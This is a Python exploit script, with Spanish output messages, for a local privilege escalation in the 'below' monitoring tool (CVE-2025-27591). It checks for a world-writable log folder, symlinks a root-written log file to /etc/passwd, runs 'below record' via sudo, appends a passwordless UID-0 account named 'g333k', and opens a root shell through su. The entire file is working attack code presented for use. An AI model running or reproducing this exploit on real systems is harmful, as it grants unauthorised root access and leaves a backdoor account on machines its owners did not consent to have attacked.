#!/usr/bin/env python3
import os
import subprocess
import sys
import pty

ROJO = "\033[91m"
VERDE = "\033[92m"
AMARILLO = "\033[93m"
AZUL = "\033[94m"
RESET = "\033[0m"

bin_path = "/usr/bin/below"
log_folder = "/var/log/below"
log_target = f"{log_folder}/error_root.log"
temp_file = "/tmp/payload"
evil_line = "g333k::0:0:g333k:/root:/bin/bash\n"

def es_world_writable(ruta):
    return bool(os.stat(ruta).st_mode & 0o002)

def es_symlink(ruta):
    return os.path.islink(ruta)

def cmd(cadena, mostrar=True):
    if mostrar:
        print(f"{AZUL}[+] Ejecutando: {cadena}{RESET}")
    try:
        return subprocess.check_output(cadena, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        if mostrar:
            print(f"{ROJO}[-] Falló: {e.output}{RESET}")
        return None

def vulnerable():
    print(f"{AMARILLO}[*] Verificando posible CVE-2025-27591...{RESET}")

    if not os.path.exists(log_folder):
        print(f"{ROJO}[-] No existe {log_folder}{RESET}")
        return False

    if not es_world_writable(log_folder):
        print(f"{ROJO}[-] {log_folder} no es world-writable{RESET}")
        return False
    print(f"{VERDE}[+] {log_folder} es world-writable{RESET}")

    if os.path.exists(log_target):
        if es_symlink(log_target):
            print(f"{VERDE}[+] {log_target} ya es symlink{RESET}")
            return True
        else:
            print(f"{AMARILLO}[!] {log_target} es archivo normal, borrando...{RESET}")
            os.remove(log_target)

    try:
        os.symlink("/etc/passwd", log_target)
        print(f"{VERDE}[+] Symlink creado: {log_target} -> /etc/passwd{RESET}")
        os.remove(log_target)
        return True
    except Exception as e:
        print(f"{ROJO}[-] No se pudo crear symlink: {e}{RESET}")
        return False

def explotar():
    print(f"{AMARILLO}[*] Iniciando exploit...{RESET}")

    with open(temp_file, "w") as f:
        f.write(evil_line)
    print(f"{VERDE}[+] Payload escrito en {temp_file}{RESET}")

    if os.path.exists(log_target):
        os.remove(log_target)
    os.symlink("/etc/passwd", log_target)
    print(f"{VERDE}[+] Symlink preparado: {log_target} -> /etc/passwd{RESET}")

    print(f"{AZUL}[*] Ejecutando 'below record' con sudo...{RESET}")
    try:
        subprocess.run(["sudo", bin_path, "record"], timeout=40)
        print(f"{VERDE}[+] 'below record' ejecutado{RESET}")
    except subprocess.TimeoutExpired:
        print(f"{AMARILLO}[!] 'below record' se quedó colgado, quizá ya escribió{RESET}")
    except Exception as e:
        print(f"{ROJO}[-] Error al ejecutar 'below': {e}{RESET}")

    print(f"{AZUL}[*] Insertando payload en /etc/passwd...{RESET}")
    try:
        with open(log_target, "a") as f:
            f.write(evil_line)
        print(f"{VERDE}[+] Payload insertado en passwd{RESET}")
    except Exception as e:
        print(f"{ROJO}[-] No se pudo insertar payload: {e}{RESET}")

    print(f"{AMARILLO}[*] Cambiando a shell con 'su g333k'...{RESET}")
    try:
        pty.spawn(["su", "g333k"])
    except Exception as e:
        print(f"{ROJO}[-] No se pudo abrir shell: {e}{RESET}")
        return False

def main():
    if not vulnerable():
        print(f"{ROJO}[-] El target no parece vulnerable{RESET}")
        sys.exit(1)
    print(f"{VERDE}[+] El target es vulnerable{RESET}")

    if not explotar():
        print(f"{ROJO}[-] Exploit falló{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()

